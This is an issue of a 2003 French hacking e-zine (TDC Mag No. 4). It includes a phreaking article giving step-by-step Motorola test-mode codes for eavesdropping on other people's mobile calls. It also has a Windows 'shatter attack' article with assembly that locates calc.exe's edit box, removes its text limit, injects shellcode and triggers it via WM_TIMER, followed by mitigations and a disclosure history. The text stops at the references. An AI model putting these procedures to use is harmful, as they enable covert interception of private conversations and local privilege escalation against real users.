<HTML>
<HEAD>
<STYLE>INPUT {
	BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; FONT-WEIGHT: normal; FONT-SIZE: 11px; BORDER-LEFT: #000000 1px solid; COLOR: #000000; BORDER-BOTTOM: #000000 1px solid; FONT-FAMILY: verdana; BACKGROUND-COLOR: #FFFFFF
}
.text {
	FONT-WEIGHT: normal; FONT-SIZE: 11px; COLOR: #a9bfc7; FONT-FAMILY: verdana
}
TEXTAREA {
	BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; FONT-WEIGHT: normal; FONT-SIZE: 11px; BORDER-LEFT: #000000 1px solid; COLOR: #000000; BORDER-BOTTOM: #000000 1px solid; FONT-FAMILY: verdana; BACKGROUND-COLOR: #FFFFFF
}
A:link {
	COLOR: #a9bfc7; TEXT-DECORATION: none
}
A:hover {
	COLOR: #e9ffff; TEXT-DECORATION: none
}
A:visited {
	TEXT-DECORATION: none
}
</STYLE>
<TITLE>TDC Mag N&deg;4</TITLE> <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1"> 
</HEAD>

<BODY BGCOLOR="#43575f" TEXT="#CCCCCC" LINK="#a9bfc7" VLINK="#a9bfc7" ALINK="#a9bfc7">
<DIV ALIGN="CENTER"> 
  <P><A HREF="http://dealerhacksecurity.free.fr"><IMG SRC="TDC%20files/DHS-bannier.gif" WIDTH="522" HEIGHT="91" BORDER="0"></A></P>
  <P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><B>DHS Team- 
    The Dealer Hack Security Team</B></FONT></P>
  <P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">************************************************************* 
    <BR>
    \\\\\\\\\\\\\\\\\\\\\\\\ooooooooo:::::<font color="#FF0000" size="3" face="Georgia, Times New Roman, Times, serif">TDC 
    Mag N&deg;4</font>:::::ooooooooo//////////////////////</FONT></P>
</DIV>
<P ALIGN="CENTER"><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Ecrit 
  le 30/09/2003</font></P>
<P ALIGN="LEFT"><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR>
  </FONT></P>
<P ALIGN="CENTER"><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">**************************<B><FONT COLOR="#CCCCCC">DHS 
  Team Contacts</FONT></B>************************** <BR>
  DHS Team Fondator &amp; Webmaster : <FONT COLOR="#FF0000">A-bone</FONT> =&gt; 
  <A HREF="mailto:alex.bone@caramail.com">alex.bone@caramail.com</A> <BR>
  DHS Team Admin &amp; R&eacute;dacteur : <font color="#FF0000">Nocte</font> =&gt; 
  <A HREF="mailto:slickers@6sens.com">slickers@6sens.com</A> <br>
  Forum Co-Administrator &amp; R&eacute;dacteur : <font color="#FF0000">deepfear</font> 
  =&gt; <a href="mailto:deepfear@netcourrier.com">deepfear@netcourrier.com</a> 
  </FONT><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR>
  ***********************************************************</FONT></P>
<P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">///////////////////////////////////////////////////////////////////////////////////////////////// 
  <BR>
  SOMMAIRE<BR>
  ///////////////////////////////////////////////////////////////////////////////////////////////// 
  </FONT></P>
<P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2" COLOR="#CCCCCC">1 
  -</FONT><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> EDITO : 
  TDC N&deg;3<BR>
  <FONT COLOR="#CCCCCC">2 -</FONT> PHREAKING :<b> Ecouter les conversation d'autrui 
  avec un Motorola-PART 1</b> - Freaker (DHS Moderator)<BR>
  <FONT COLOR="#CCCCCC">3 -</FONT> HACKING :<b> Vuln&eacute;rabilit&eacute; architecturale 
  de Windows / Shatter Attacks</b>- Etherlord (DHS Moderator)<BR>
  <FONT COLOR="#CCCCCC">4 -</FONT> VIRUS : <b>Introduction aux virus ELF </b>- 
  deepfear<br>
  5 - SHELLCODING : <b>Fun and Games with Evoluates Shellcodes</b></FONT><font size="2" face="Arial, Helvetica, sans-serif"> 
  - Nocte</font><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><br>
  6 - failles: <b>DHS Security Advisories </b></FONT><font size="2" face="Arial, Helvetica, sans-serif">- 
  DHS Team Admin</font><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR>
  ///////////////////////////////////////////////////////////////////////////////////////////////// 
  <BR>
  </FONT></P>
<P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">===================================================================== 
  <BR>
  1. EDITO.<BR>
  ===================================================================== </FONT></P>
<P><font size="2" face="Arial, Helvetica, sans-serif"> Deux mois apr&egrave;s 
  l'issue 3, DHS Team signe l&agrave; le 4 num&eacute;ro de TDC Mag, un e-zine 
  ax&eacute; Hacking Security. Notre Team taff tr&egrave;s dur actuellement (note 
  de A-bone : a qui le dis-tu ??) en vue de l'imminente sortie du nouveau site 
  officiel de DHS Team ainsi que du Challenge DHS. N'oubliez pas que, chaque semaine, 
  DHS propose sur son forum des D&eacute;fis orient&eacute; Programmation S&eacute;curis&eacute;e.</font><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
  Ce num&eacute;ro est centr&eacute;e sur la s&eacute;curit&eacute;, comme les 
  autres. </font><font size="2" face="Arial, Helvetica, sans-serif">A noter un 
  article court sur les virus ELF mais qui aboutira dans la num&eacute;ro prochain 
  a la programmation d'un virus sous unix. Suit un article de niveau &eacute;lite 
  bas&eacute; sur les Shellcodes polymorphiques.</font><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
  Une nouvelle section appara&icirc;t : DHS Security Advisories. En effet, entre 
  les deux num&eacute;ros de TDC Mag, DHS Team a pris la r&eacute;solution de 
  s'investir davantage dans la d&eacute;couverte de failles applicatives et techniques. 
  Ainsi deux Buffers overflow dans WIndows ont &eacute;t&eacute; d&eacute;couverts 
  et une faille majeure sur le serveur de Caramail. Avec un esprit de s&eacute;curit&eacute;, 
  nous avons averti tant Caramail que Microsoft. Je n'en dis pas plus, d&eacute;couvrez 
  la suite vous m&ecirc;me. NOus publions ausis un full-disclosure sur 2 failles 
  majeures d&eacute;couvertes sur notre WebSite !)<br>
  <br>
  Oui, DHS s'investit dans la S&eacute;curit&eacute;. Comment lier Securit&eacute; 
  et Hacking ? Les liens sont tr&egrave;s &eacute;troits ! En effet, comment bien 
  se s&eacute;curiser si nous ne connaissons les diff&eacute;rentes m&eacute;thodes 
  d'attaques pouvant &ecirc;tre mise en oeuvres ? Ce n'est qu'en connaissant son 
  ennemi qu'on est le mieux &agrave; m&ecirc;me de s'en prot&eacute;ger... <br>
  Notre objectif est d'aider des soci&eacute;t&eacute;s et particuliers &agrave; 
  prendre conscience de la n&eacute;cessit&eacute; de revoir leur strat&eacute;gie 
  de s&eacute;curi&eacute; et leur insulfer le d&eacute;sir d'apprendre &agrave; 
  conna&icirc;tre, comprendre les rouages internes des techniques d'attaques, 
  du fonctionnement des r&eacute;seaux... C'est &ccedil;a le v&eacute;ritable 
  sens du terme &quot;hacking&quot; (trop souvent d&eacute;nigr&eacute; par des 
  boards de djeunz qui m&eacute;langent sexe et piratage de script-kiddies...)</font></P>
<P> <font face="Verdana, Arial, Helvetica, sans-serif" size="2">Sur ce, amusez-vous 
  bien et bonne lecture ;)</font> 
<P> DHS-Team Admin 
<P></P>
<P>&nbsp;</P>
<P></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">===================================================================== 
<BR>
  2 . PHREAKING : <b>ECOUTER LES CONVERSATIONS D'AUTRUI AVEC UN MOTORLA - PART 
  1</b><BR>
  ===================================================================== </FONT></P>
<P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Date : 28/07/2003<BR>
  Auteur : <A HREF="mailto:cyberfreak@caramail.com">Freaker</A> (DHS Moderator)<BR>
  Produit : mobile Motorola</FONT></P>
<P>Avant de commencer j'aimerais tout d'abord vous demender de ne pas utiliser 
  ces informations &agrave; des fins ill&eacute;gales,merci. Je - et DHS aussi 
  - ne suis en aucun cas responsable de l'utilisation que vous ferez de cette 
  information. Bon maintenant on commence </P>
<p>Premi&egrave;rement commen&ccedil;ons par &eacute;numerer quelques codes :<br>
  # Pour initialiser <br>
  08# Active l'&eacute;couteur du phone <br>
  07# D&eacute;sactive l'&eacute;couteur <br>
  47x# Commande pour cont&ocirc;ler le volume (x varie entre 1 et 7 (1 min 7 max))<br>
  11(c.n)# Connecte &agrave; la cha&icirc;ne de transmissions (c.n=canal de transfert 
  3 chiffres maximum) </p>
<p><br>
  Voyons maintenant d'autre code pour motorola <br>
  45# Donne la force du signal de votre canal <br>
  10# Active l'emmeteur <br>
  09# D&eacute;sactive l'&eacute;m&eacute;teur <br>
  05# Active la port&eacute; de la transmission <br>
  06# D&eacute;sactive la port&eacute; de la transmission <br>
  40# Donne desinfo sur le canal de voix </p>
<p><br>
  PROCEDURE </p>
<p>1 -Prends ton cellulaire <br>
  2 -entre le test mode code de ton cellulaire (si tu le connais pas cherche le 
  sur : http://mobile.box.sk ) ou dans la bible du motorola disponible par email 
  freakerz@caramail.com <br>
  3 -presser # pour entrer dans le mode <br>
  4 -08# pour activer le r&eacute;cepteur Rx <br>
  5 -10# pour activer ton &eacute;meteur Tx <br>
  6 -11xxx# xxx &eacute;tant une variable (voir plus bas) <br>
  7 -esp&egrave;re peut &ecirc;tre avoir une conversation <br>
  8 -45# pour la force du signal <br>
  9 -force du signal &gt;75 sinon changer de canal <br>
  10-05# active la port&eacute; de transmission <br>
  11-excuse toi de t'introduire ainsi dans leur conversation <br>
  12-06# d&eacute;sactive la port&eacute; <br>
  13-&eacute;coute la conversation <br>
  14-d&eacute;connecte toi </p>
<p><br>
  - Comment savoir le canal sur lequel on est? Tr&egrave;s simple: <br>
  40# cette commande te permets de savoir le canal (attention, la valeur donn&eacute;e 
  est en hexad&eacute;cimal). Lorsqu'on l'entre une chaine de caract&egrave;re 
  apparait du type 325-00142d6.Les tois premiers caract&egrave;res ne nous interr&eacute;ssent 
  pas.<br>
  Regardons 00142d6 : le &quot;0&quot; ne sert &agrave; rien.<br>
  Prenons le &quot;014&quot; <br>
  convertissons &quot;014&quot; en binaire :<br>
  0===&gt;0000 <br>
  1===&gt;0001 <br>
  4===&gt;0100 <br>
  ce qui nous donne 000000010100 <br>
  Laisons les deux premiers bits nous obtenons 0000010100 <br>
  convertisons en decimal nous obtenons 020 <br>
  Et ceci est le canal. Il est recommand&eacute; d'utiliser trois t&eacute;l&eacute;phone 
  :un pour &eacute;couter, un pour parler, un pour scanner avec la commande #40. 
  <br>
  Essayer ceci sur d'autres marque de mobile, mes tests se sont port&eacute;s 
  uniquement sur des Motorola.<br>
  J'esp&egrave;re que vous appr&eacute;cizrez ce petit article.<br>
  enjoy and have fun.<br>
  <br>
  To be continued... </p>
<P>&nbsp;</P>
<P ALIGN="CENTER"><B><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2" COLOR="#FF0000">...::: 
  Phreaking By</FONT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2"> Freaker<FONT COLOR="#FF0000">:::...</FONT></FONT></B></P>
<P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">===================================================================== 
  <BR>
  3 . HACKING : <b>VULNERABILITE ARCHITECTURALE DE WINDOWS / SHATTER ATTACKS</b><BR>
  =====================================================================</FONT></P>
<P ALIGN=LEFT><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Date : 07/05/2003<BR>
  Auteur : <A HREF="mailto:etherlord@ziplip.com">Etherlord</A> (DHS Moderator)<BR>
  Produit : Windows 9.x</FONT></P>
<P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">---------------------------------------------------------<br>
  Vuln&eacute;rabilit&eacute; architecturale du syst&egrave;me op&eacute;ratif 
  Windows <br>
  ---------------------------------------------------------<br>
  And remember - if it ain't broke, hit it again - [C.Paget] </FONT></P>
<p>1. Introduction <br>
  ===========<br>
  Le document pr&eacute;sent est principalement livr&eacute; &agrave; titre informatif 
  quant &agrave; la s&eacute;curit&eacute; li&eacute;e au syst&egrave;me op&eacute;ratif 
  Windows. Le syst&egrave;me Windows pr&eacute;sente une vuln&eacute;rabilit&eacute; 
  architecturale qui rend d&eacute;licate la &quot;s&eacute;curisation forte&quot; 
  d'un serveur. Il faut &ecirc;tre conscient de cette vuln&eacute;rabilit&eacute;. 
  Les administrateurs et les d&eacute;veloppeurs trouveront au chapitre 5 quelques 
  recommandations pour limiter l'exploitation de cette vuln&eacute;rabilit&eacute;. 
</p>
<p>La d&eacute;monstration du pr&eacute;sent document est limit&eacute;e &agrave; 
  l'exploitation th&eacute;orique (l'application utilis&eacute;e pour la demonstration 
  n'est PAS exploitable par ce proced&eacute; pour augmenter ses privil&egrave;ges 
  puisque elle est execut&eacute;e avec les cr&eacute;dit de l'utilisateur. L'exploitation 
  de cette vuln&eacute;rabilit&eacute; s'applique &agrave; tous les processus 
  de Windows <br>
  ayant les privil&egrave;ges SYSTEME (il y en as plusieurs, je vous laisse les 
  trouver..), toutefois il faut &ecirc;tre conscient que l'application de la th&eacute;orie 
  ne n&eacute;cessite que des connaissances de base de la programmation des APIs 
  Windows. Un exploit pour cette vuln&eacute;rabilit&eacute; peut &ecirc;tre envoy&eacute; 
  sous forme de texte par e-mail ou r&eacute;cup&eacute;r&eacute; sur une page 
  web pour &ecirc;tre ensuite compil&eacute; en local par l'utilisateur en utilisant 
  les utilitaires Windows install&eacute;s par d&eacute;faut debug.exe, <br>
  peut &eacute;galement compiler). Donc m&ecirc;me une acompte Invit&eacute; pr&eacute;sente 
  cette vuln&eacute;rabilit&eacute;. </p>
<p>2. Les messages syst&egrave;mes Windows <br>
  =========================<br>
  Les applications qui tournent sur le syst&egrave;me op&eacute;ratif Windows 
  sont enti&egrave;rement contr&ocirc;l&eacute;es &agrave; travers un m&eacute;canisme 
  de message. Quand une touche est activ&eacute;e, un message est envoy&eacute; 
  &agrave; la fen&ecirc;tre active de l'application qui sp&eacute;cifie qu'une 
  touche a &eacute;t&eacute; activ&eacute;e. Quand Windows d&eacute;cide de redessiner 
  une partie de l'&eacute;cran, il envoie un message a <br>
  l'application. En r&eacute;alit&eacute;, tous les &eacute;v&eacute;nements qui 
  prennent place dans le syst&egrave;me et dont l'application peut avoir besoin 
  sont transmis avec ce m&eacute;canisme de message. Ces messages sont places 
  dans une m&eacute;moire tampon et sont ex&eacute;cut&eacute;s par l'application 
  dans leur ordre d'arriv&eacute;e. </p>
<p>C'est un m&eacute;canisme tr&egrave;s fiable pour contr&ocirc;ler les applications. 
  A priori. En effet, sur les architectures Windows, ce m&eacute;canisme est mal 
  con&ccedil;u. N'importe quelle application peut envoyer un message &agrave; 
  n'importe quel fen&ecirc;tre qui est pr&eacute;sente sur le syst&egrave;me, 
  ind&eacute;pendamment du fait que l'application soit propri&eacute;taire ou 
  nom de la fen&ecirc;tre &agrave; laquelle elle adresse un message. Il n'y a 
  aucun m&eacute;canisme pour authentifier la source d'un message. Un message 
  provenant d'une source malicieuse n'est pas discernable d'un message provenant 
  du noyau du syst&egrave;me. C'est cette absence d'authentification qui peut 
  &ecirc;tre exploit&eacute;e, prenant en consid&eacute;ration que les messages 
  peuvent &ecirc;tres utilis&eacute;s pour manipuler des fen&ecirc;tres et donc 
  les processus qui en sont propri&eacute;taires. </p>
<p>Au niveau de la s&eacute;curit&eacute;, on obtient ici un moyen facile d'escalader 
  les privil&egrave;ges d'un acompte. Pour exploiter cette attaque, il est n&eacute;cessaire 
  a priori de disposer d'un acc&egrave;s physique &agrave; la machine (en r&eacute;alit&eacute;, 
  l'exploitation a distance est possible, elle n&eacute;cessite une &eacute;tape 
  suppl&eacute;mentaire qui est l'exploitation d'un service r&eacute;seau), toutefois 
  cette attaque permet d'obtenir des privil&egrave;ges administrateur depuis n'importe 
  quel compte, y compris un compte invit&eacute;. </p>
<p>3. Les d&eacute;passement de m&eacute;moire tampon (buffers overflow) <br>
  ========================================<br>
  Les d&eacute;passements de tampon apparaissent lorsqu'un programme essaye de 
  stocker plus de donn&eacute;es dans un tampon (zone temporaire de stockage de 
  donn&eacute;es en m&eacute;moire) que ce dernier n'est capable de prendre en 
  charge. Les tampons sont &agrave; l'origine cr&eacute;es pour contenir un nombre 
  de donn&eacute;es d&eacute;finies, l'information suppl&eacute;mentaire (qui 
  doit aller quelque part) peut &eacute;craser les tampons adjacents, modifiant 
  les donn&eacute;es valides contenues dans le tampon adjacent. Lorsqu'un de ces 
  tampons fait partie de la pile d'ex&eacute;cution (stack), il est possible de 
  modifier le flux du programme et de lui faire ex&eacute;cuter du code arbitraire. 
  Le code sera alors ex&eacute;cut&eacute; avec les privil&egrave;ges de l'application 
  exploit&eacute;e, et non ceux de l'utilisateur. </p>
<p>Les d&eacute;passements de tampons sont &agrave; l'origine de nombreuses exploitations. 
  A l'origine, une exploitation utilisant les d&eacute;passements de m&eacute;moire 
  tampon n&eacute;cessite une application &quot;bugg&eacute;&quot; (Soit en utilisant 
  des fonctions qui pr&eacute;sentent ce probl&egrave;me (en C: strcat(), strcpy(), 
  sprintf(), vsprintf(), bcopy(), gets(), et scanf()), soit en introduisant des 
  erreurs dans le code). Avec le syst&egrave;me de messages Windows, m&ecirc;me 
  une application prot&eacute;g&eacute;e contre les d&eacute;passement de m&eacute;moire 
  tampon peut &ecirc;tre exploit&eacute;e, puisqu'il est possible de supprimer 
  la protection mise en place par le programme <br>
  si cette protection repose sur les m&eacute;canismes Windows (protection par 
  un param&eacute;trage de l'objet). </p>
<p>4. Exemple de modification d'un executable livr&eacute; avec le syst&egrave;me. 
  <br>
  =============================================</p>
<p>Ici sera seulement d&eacute;montr&eacute;e la partie qui vise &agrave; modifier 
  un ex&eacute;cutable &agrave; priori fiable, pour le rendre vuln&eacute;rable 
  &agrave; une exploitation par d&eacute;passement de m&eacute;moire tampon. A 
  l'origine, l'ex&eacute;cutable est prot&eacute;g&eacute; contre ce type d'attaque 
  (champs d'entr&eacute;e de la donn&eacute;e limit&eacute; en taille). Des d&eacute;monstration 
  plus compl&egrave;tes sont disponibles sur internet (exploitation de la console 
  anti-virus McAfee). </p>
<p>Ce dont il faut bien prendre conscience, c'est que la majorit&eacute; des entreprises 
  qui travaillent avec des syst&egrave;mes Windows ont toutes un environnement 
  commun, et probablement des strat&eacute;gies communes. On peut parier que la 
  plupart des industries disposent de protection Anti-virus. Il y as de grande 
  chances pour que ces anti-virus soient tr&egrave;s r&eacute;pandus (Norton, 
  McAfee, Trend). On peut &eacute;galement imaginer que la suite Office est pr&eacute;sente 
  dans de nombreuses industries. Il est donc tr&egrave;s facile a quiconque dispose 
  de bases en programmation d'installer ces logiciels chez lui et de tranquillement 
  &eacute;tablir les programmes n&eacute;cessaires &agrave; l'exploitation de 
  ces produits tr&egrave;s r&eacute;pandus. La phase d'attaque consisterait alors 
  qu'au d&eacute;ploiement sur la machine cible d'un ex&eacute;cutable. N'importe 
  quel utilisateur 'l&eacute;gal' d'un r&eacute;seau est apte &agrave; mener &agrave; 
  bien ce type d'attaque puisque qu'un compte 'invit&eacute;' (guest) suffit &agrave; 
  l'ex&eacute;cution de l'exploit. </p>
<p>L'exploitation du syst&egrave;me de messages Windows peut &ecirc;tre &eacute;tendue 
  a toutes les applications Windows. </p>
<p><br>
  4.1.Calc.exe <br>
  ------------ <br>
  Le but principal de cette attaque est de modifier les propri&eacute;t&eacute;s 
  d'un champs de mani&egrave;re &agrave; le rendre vuln&eacute;rable &agrave; 
  l'exploitation d'un d&eacute;passement de tampon (buffer overflow). Les diff&eacute;rentes 
  &eacute;tapes de l'attaque consistent &agrave; : </p>
<p>- Identifier une sous-fen&ecirc;tre de l'application (par exemple, une boite 
  d'&eacute;dition) et obtenir son &quot;handle&quot; (identifiant Windows). - 
  Supprimer les restrictions li&eacute;es &agrave; la longueur du message qui 
  peut &ecirc;tre entr&eacute; dans la bo&icirc;te d'&eacute;dition. <br>
  - Coller un morceau de code ex&eacute;cutable dans la bo&icirc;te d'&eacute;dition 
  pr&eacute;c&eacute;demment modifi&eacute;e. <br>
  - Forcer l'application &agrave; ex&eacute;cuter le code soumis. </p>
<p>Pour l'exemple, nous n'effectuerons que les deux premi&egrave;res &eacute;tapes 
  avec programme calc.exe (install&eacute; par d&eacute;faut sur tous les OS Windows). 
  La troisi&egrave;me &eacute;tape est assez simple au niveau programmation (API 
  SetDlgItemTextA), quand &agrave; la 4&egrave;me, il ne s'agit que de modifier 
  l'adresse de retour d'un 'shellcode' par rapport &agrave; l'application exploit&eacute;e. 
  Ce dernier point n'&eacute;tant pas le but de ce document, il sera laiss&eacute; 
  de cot&eacute;. </p>
<p><br>
  1&egrave;re &eacute;tape: <br>
  ----------- </p>
<p>La premi&egrave;re &eacute;tape consiste &agrave; localiser un contr&ocirc;le 
  d'&eacute;dition ou de m&ecirc;me type, un contr&ocirc;le dans lequel on puisse 
  injecter des informations. Les restriction &eacute;ventuelles sur ce contr&ocirc;le 
  peuvent &ecirc;tre d&eacute;sactiv&eacute;e. Il nous faut ici un logiciel qui 
  soit capable de lister pour un processus particulier les propri&eacute;t&eacute;s 
  de cette application (nom de classe, identifiant Windows, etc.). Pour notre 
  exemple, l'utilitaire Spy &amp; Capure Version 2.70 a &eacute;t&eacute; utilis&eacute;. 
  Ce <br>
  logiciel liste les processus tournant en m&eacute;moire, et la s&eacute;lection 
  d'un processus permet d'obtenir les informations recherch&eacute;es: </p>
<p>Informations n&eacute;cessaires &agrave; l'exploitation : </p>
<p>Nom de fen&ecirc;tre : Calculatrice <br>
  Nom de classe : SciCalc </p>
<p><br>
  2&egrave;me &eacute;tape: <br>
  ----------- </p>
<p>Pour la deuxi&egrave;me &eacute;tape, il s'agit d'adresser la bo&icirc;te d'&eacute;dition 
  de la calculatrice. Par d&eacute;faut, cette bo&icirc;te d'&eacute;dition n'autorise 
  que l'insertion de 32 caract&egrave;res.<br>
  La bo&icirc;te d'&eacute;dition &eacute;tant consid&eacute;r&eacute;e par le 
  syst&egrave;me comme une sous-fen&ecirc;tre de l'application calculatrice, nous 
  pouvons trouver son identifiant en recherchant d'abord l'identifiant de l'application 
  &quot;calculatrice&quot; &agrave; l'aide des informations trouv&eacute;es pr&eacute;c&eacute;demment 
  : </p>
<p><br>
  ;--------------------------------------------------------- <br>
  ; Extrait de code assembleur windows 32 bit pour trouver <br>
  ; l'identifiant de l'application avec FindWindow <br>
  .data <br>
  lp2ClassName db &quot;SciCalc&quot;,0 <br>
  lp2WindowName db &quot;Calculatrice&quot;,0 </p>
<p>.code <br>
  invoke FindWindow, addr lp2ClassName, addr lp2WindowName <br>
  .if eax!=NULL <br>
  mov hwndParent,eax ; on enregistre l'identifiant <br>
  ;--------------------------------------------------------- </p>
<p><br>
  Une fois l'identifiant de l'application trouv&eacute;, on peut rechercher l'identifiant 
  des sous-fen&ecirc;tres en utilisant l'API FindWindowEx. L'identifiant de la 
  sous-fen&ecirc;tre va nous permettre d'adresser des messages &agrave; cet objet. 
  Avec cet identifiant, on envoie d'abord un message pour supprimer la limite 
  du texte, puis on injecte le code a ex&eacute;cuter dans la bo&icirc;te d'&eacute;dition, 
  un appel a WM_TIMER lance l'ex&eacute;cution du code: </p>
<p><br>
  ;--------------------------------------------------------- <br>
  invoke FindWindowEx,hwndParent,hwndChildAfter, addr Ed1ClassName <br>
  , NULL <br>
  ; si eax &lt;&gt;0, on as trouve l'identifiant <br>
  .if eax!=NULL <br>
  mov hwindfirst,eax <br>
  ; on utilise les messages windows pour supprimer la limitte <br>
  invoke SendMessage,hwindfirst,EM_SETLIMITTEXT,ExtSize,NULL <br>
  ; on injecte le shellcode <br>
  invoke SendMessage,hwindfirst,WM_SETTEXT,NULL,addr ShellCode <br>
  ; on execute le shellcode avec WM_TIMER <br>
  invoke SendMessage,hwndParent,WM_TIMER,1,hwindfirst <br>
  ;--------------------------------------------------------- </p>
<p><br>
  Apr&egrave;s ex&eacute;cution de l'exploit, la limite est supprim&eacute;e. 
</p>
<p>5. Les Solutions Possibles : <br>
  ===================<br>
  Il n'y a pas de r&eacute;elle solution pour ce probl&egrave;me. La vuln&eacute;rabilit&eacute; 
  &eacute;tant li&eacute;e &agrave; l'architecture Windows, pour r&eacute;soudre 
  le probl&egrave;me il faudrait que le syst&egrave;me puisse : </p>
<p>- Interdire la transmission de messages entre des applications disposant de 
  privil&egrave;ges diff&eacute;rents. (Un processus 'invit&eacute;' ne devrait 
  pas pouvoir envoyer un message de commande &agrave; un processus 'local system') 
</p>
<p>- Ajouter une information dans le message sur la source, et laisser l'application 
  d&eacute;cider si elle doit ou ne doit pas prendre en compte le message. </p>
<p>Malheureusement, les fonctions n&eacute;cessaires pour ex&eacute;cuter cela 
  sont absente du syst&egrave;me d'exploitation Windows. Pratiquement, il n'y 
  a pas de solution simple possible. Microsoft est conscient du probl&egrave;me 
  depuis des ann&eacute;es, il y a eus plusieurs tentatives pour modifier ce comportement 
  mais toutes les tentatives ont finalement apport&eacute; plus <br>
  de probl&egrave;mes qu'elles n'en r&eacute;solvent. </p>
<p>Les administrateurs et d&eacute;veloppeurs trouveront quelques conseils ci-apr&egrave;s 
  pour limiter l'exploitation de cette vuln&eacute;rabilit&eacute;. Ce ne sont 
  que des conseils. Le syst&egrave;me Windows pr&eacute;sentant &eacute;norm&eacute;ment 
  de situation critiques, la s&eacute;curisation &agrave; 100% du cot&eacute; 
  application ne seras probablement jamais possible. </p>
<p><br>
  Administration des serveurs : <br>
  ----------------------------- <br>
  - S'assurer qu'un serveur sensible soit physiquement inatteignable par les personnes 
  qui n'ont pas &agrave; acc&eacute;der &agrave; ce serveur (ne JAMAIS n&eacute;gliger 
  la s&eacute;curit&eacute; physique pour un serveur) </p>
<p>- Supprimer du serveur toutes les application install&eacute;es par d&eacute;faut 
  qui ne sont pas n&eacute;cessaire (supprimer physiquement les ex&eacute;cutables, 
  les plus dangereux &eacute;tant : debug.exe, cmd.exe, telnet.exe, mplay.exe) 
  qui permettent l'exploitation ou peuvent &ecirc;tres exploit&eacute;s. Certaines 
  de ces applications devraient imp&eacute;rativement &ecirc;tres supprim&eacute;es). 
</p>
<p>- Ne pas ex&eacute;cuter d'application avec des privil&egrave;ges sup&eacute;rieurs 
  &agrave; ceux n&eacute;cessaires au bon d&eacute;roulement de l'application 
  (ne pas installer un agent avec des privil&egrave;ges LOCAL_SYSTEM si des privil&egrave;ges 
  BACKUP_OPERATOR sont suffisant). </p>
<p><br>
  D&eacute;veloppement : <br>
  --------------- <br>
  - Lors de la validation d'une donn&eacute;e entr&eacute;e par un utilisateur, 
  ne JAMAIS se fier &agrave; une limitation d&eacute;finie par le syst&egrave;me 
  sur un objet (par exemple, longueur maximale d'un champs edit). TOUJOURS &quot;sanitiser&quot; 
  une donn&eacute;e utilisateur par un traitement interne au programme. </p>
<p>- V&eacute;rifier en &quot;live&quot; que les param&egrave;tres des objets 
  modifiables par messages n'ait pas &eacute;t&eacute;s modifi&eacute;s apr&egrave;s 
  le lancement du programme dans le cas d'un &eacute;l&eacute;ment critique (Interaction 
  avec l'utilisateur ET le syst&egrave;me). </p>
<p><br>
  Historique de la vuln&eacute;rabilit&eacute;: <br>
  ------------------------------- </p>
<p>08/05/02 - Pr&eacute;sentation de la vuln&eacute;rabilit&eacute; par Symeon 
  Xenitellis &agrave; la conf&eacute;rence IFIP/SEC2002 <br>
  07/07/02 - S.Xenitellis rend la vuln&eacute;rabilit&eacute; publique a travers 
  plusieurs listes d&eacute;di&eacute;es &agrave; la s&eacute;curit&eacute;. <br>
  08/07/02 - Pr&eacute;sentation de la vuln&eacute;rabilit&eacute; par S.Xenitellis 
  &agrave; la conf&eacute;rence ECIW <br>
  01/08/02 - Report de la vuln&eacute;rabilit&eacute; et pr&eacute;sentation de 
  l'exploit &quot;shatter attack&quot; par Chris Paget (NGSS Software) &agrave; 
  Microsoft. <br>
  05/08/02 - Microsoft minimise le probl&egrave;me, et consid&egrave;re que cela 
  n'est pas li&eacute; &agrave; la s&eacute;curit&eacute; car l'exploitation implique 
  soit que l'utilisateur ex&eacute;cute du code malicieux sur sa machine soit 
  que l'attaquant ait acc&egrave;s physique &agrave; la machine. (C'est oublier 
  le principale probl&egrave;me: escalade de privil&egrave;ges) <br>
  05/09/02 - Microsoft reconna&icirc;t le probl&egrave;me dans une r&eacute;ponse 
  publique en signalant qu'il sont au courant du probl&egrave;me depuis 1994 (article 
  publi&eacute; dans le Knowledge Base Microsoft) <br>
  11/12/02 - Premi&egrave;re publication par Microsoft d'un patch cens&eacute; 
  adresse une partie du probl&egrave;me (MS02-071 : Exploitation du message WM_TIMER). 
  <br>
  17/12/02 - Microsoft met &agrave; jour les informations du bulletin MS02-071. 
  <br>
  03/02/03 - Le patch est retir&eacute;, car il cause des probl&egrave;mes sur 
  le syst&egrave;me Windows NT <br>
  07/02/03 - Un nouveau patch est publi&eacute;, le bulletin MS02-071 est mis 
  &agrave; jour. Le patch n'adresse toujours que WM_TIMER (sympt&ocirc;me), en 
  laissant de cot&eacute; toutes les autres vuln&eacute;rabilit&eacute;s li&eacute;es 
  (cause du probl&egrave;me). Microsoft signale que les &quot;good coding practices&quot; 
  impliquent que les services qui interagissent avec le bureau ne doivent pas 
  tourner avec des privil&egrave;ges &eacute;lev&eacute;s. Le point d&eacute;licat 
  ici, c'est qu'une installation par d&eacute;faut de Windows installe beaucoup 
  de services qui interagissent avec le bureau et disposent des privil&egrave;ges 
  LOCAL_SYSTEM (un des privil&egrave;ge les plus &eacute;lev&eacute; qu'il soit 
  possible d'obtenir sous Windows). </p>
<p><br>
  R&eacute;f&eacute;rences: <br>
